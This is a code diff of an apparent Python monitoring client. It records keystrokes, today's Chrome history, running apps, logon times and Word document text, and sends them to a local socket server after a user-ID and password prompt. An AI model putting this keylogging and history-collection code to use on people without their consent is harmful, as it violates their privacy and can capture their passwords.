@@ -18,6 +18,7 @@ sock.connect(("localhost",55000))
 visited_websites = []
 user_id = ""
 
+
 def get_buffer(data):
     length = len(data)
     count = 0
@@ -28,18 +29,6 @@ def get_buffer(data):
 
     buffer = (5-count)*'0' + f'{len(data)}'
     return buffer
-
-buffer = sock.recv(5).decode()
-data = sock.recv(int(buffer))
-print(data.decode())
-password = input()
-
-buffer = get_buffer(password)
-sock.send(buffer.encode())
-sock.send(password.encode())
-
-buffer = sock.recv(5).decode()
-user_id = sock.recv(int(buffer)).decode()
 
 
 def convert_to_human_time(dtmDate):
@@ -58,6 +47,7 @@ def convert_to_human_time(dtmDate):
         strDateTime = f"{first_segment}{second_segment}"
     
     return strDateTime
+
 
 def get_logon_logoff():
     strComputer = "."
@@ -97,6 +87,7 @@ def get_running_apps():
     sock.send(buffer.encode())
     sock.send(f"new_apps:{user_id}:{apps}".encode())
 
+
 def get_tabs():
     c = Chrome()
     outputs = c.fetch_history()
@@ -109,8 +100,9 @@ def get_tabs():
     
     for tab in his:
         date = tab[0].strftime('%d/%m/%Y')
-        if date == today:
+        if date == today and tab[1] not in visited_websites:
             websites.append(tab[1])
+            visited_websites.append(tab[1])
     
     websites = [f"{url}  {get_website_title(url)}" for url in websites]
     websites = ';'.join(websites)
@@ -118,7 +110,8 @@ def get_tabs():
     buffer = get_buffer(f"new_websites>{user_id}>{websites}")
     sock.send(buffer.encode())
     sock.send(f"new_websites>{user_id}>{websites}".encode())
-    
+
+
 def get_website_title(url):    
     # making requests instance
     reqs = requests.get(url)
@@ -127,6 +120,7 @@ def get_website_title(url):
     soup = BeautifulSoup(reqs.text, 'html.parser')
     
     return soup.find_all('title')[0].get_text()
+
 
 def type_trace():
     recorded = keyboard.record(until='enter')
@@ -140,6 +134,7 @@ def type_trace():
     buffer = get_buffer(f"new_text*{user_id}*{all_keys}")
     sock.send(buffer.encode())
     sock.send(f"new_text*{user_id}*{all_keys}".encode())
+
 
 def get_word_docs():
     # Initialize an empty list to store the Word documents
@@ -199,7 +194,39 @@ def get_word_text(doc):
     sock.send(buffer.encode())
     sock.send(f"new_text*{user_id}*{new_words}".encode())
 
-get_tabs()
+
+def start_server_conn():
+    global user_id
+
+    buffer = sock.recv(5).decode()
+    data = sock.recv(int(buffer))
+    print(data.decode())
+    status = input()
+
+    buffer = get_buffer(status)
+    sock.send(buffer.encode())
+    sock.send(status.encode())
+
+    buffer = sock.recv(5).decode()
+    data = sock.recv(int(buffer))
+    print(data.decode())
+    user_id = input()
+
+    buffer = get_buffer(user_id)
+    sock.send(buffer.encode())
+    sock.send(user_id.encode())
+
+    buffer = sock.recv(5).decode()
+    data = sock.recv(int(buffer))
+    print(data.decode())
+    password = input()
+
+    buffer = get_buffer(password)
+    sock.send(buffer.encode())
+    sock.send(password.encode())
+
+
+start_server_conn()
 
 # def task(message):
 #     # report the custom message
